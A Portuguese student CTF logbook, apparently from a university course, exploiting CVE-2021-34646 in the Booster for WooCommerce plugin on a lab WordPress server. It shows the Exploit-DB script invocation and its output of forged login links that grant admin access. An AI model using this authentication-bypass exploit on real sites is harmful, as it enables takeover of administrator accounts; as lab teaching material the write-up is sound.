# Logbook3

## Primeira parte

Começamos por ceder à página **http://ctf-fsi.fe.up.pt:5001**, um servidor WordPress, e procurar por todas as dependências/plugins do site tanto no código-fonte como nas várias páginas do site. 

Ao navegar pelos produtos do site encontramos o "WordPress Hosting" e na "Additional Information" desse mesmo produto descobrimos as seguintes dependências/plugins:

- #### Wordpress 5.8.1
- #### Woocommerce plugin 5.7.1
- #### Booster for WooCommerce plugin 5.4.3

Após esta descoberta procuramos na internet alguma vulnerabilidade 
destas dependências e respetivas versões que pudesse ser utilizada para nos autenticarmos como outro utilizador numa plataforma. Acabamos 
por encontrar a CVE-2021-34646, uma vulnerabilidade do Booster for WooCommerce plugin 5.4.3 que correspondia ao que procurávamos.

Submetemos a **flag[CVE-2021-34646]** e concluímos a primeira etapa.

## Segunda parte

Após aceder à seguinte página **https://www.exploit-db.com/exploits/50299** encontramos uma explicação detalhada de como explorar a vulnerabilidade que tinhamos identificado e um script em Python.
 Primeiro tivemos que descobrir o ID de um administrador. Depois de confirmar que o userID do admin era 1, tinhamos todas as informações necessárias para correr o script de Python disponível na página citada no parágrafo anterior e autenticarmo-nos como administrador da plataforma.

Escrevemos no terminal o seguinte:
````
$ python3 exploit.py http://ctf-fsi.fe.up.pt:5001 1
````

E foram criados os seguintes links:

````
Timestamp: Sat, 07 Oct 2023 14:24:29 GMT
Timestamp (unix): 1696688669

We need to generate multiple timestamps in order to avoid delay related timing errors
One of the following links will log you in...

#0 link for hash 4483648f775bada837cd01ff4912fd7e:
http://ctf-fsi.fe.up.pt:5001/my-account/?wcj_verify_email=eyJpZCI6IjEiLCJjb2RlIjoiNDQ4MzY0OGY3NzViYWRhODM3Y2QwMWZmNDkxMmZkN2UifQ

#1 link for hash 7cdedfcd573df0e2ee6c62f2733ce7e8:
http://ctf-fsi.fe.up.pt:5001/my-account/?wcj_verify_email=eyJpZCI6IjEiLCJjb2RlIjoiN2NkZWRmY2Q1NzNkZjBlMmVlNmM2MmYyNzMzY2U3ZTgifQ

#2 link for hash 5738fc0222e582b5b6441737cdeff829:
http://ctf-fsi.fe.up.pt:5001/my-account/?wcj_verify_email=eyJpZCI6IjEiLCJjb2RlIjoiNTczOGZjMDIyMmU1ODJiNWI2NDQxNzM3Y2RlZmY4MjkifQ
````

A partir daqui precisamos apenas de aceder a um dos links e passamos a estar autenticados como administradores do site.

Depois disto apenas tivemos que aceder à página **http://ctf-fsi.fe.up.pt:5001/wp-admin/edit.php** tal como foi especificado no guião fornecido no moodle e encontrar a flag do desafio no post privado "Message to our employees": `flag{please don't bother me}`.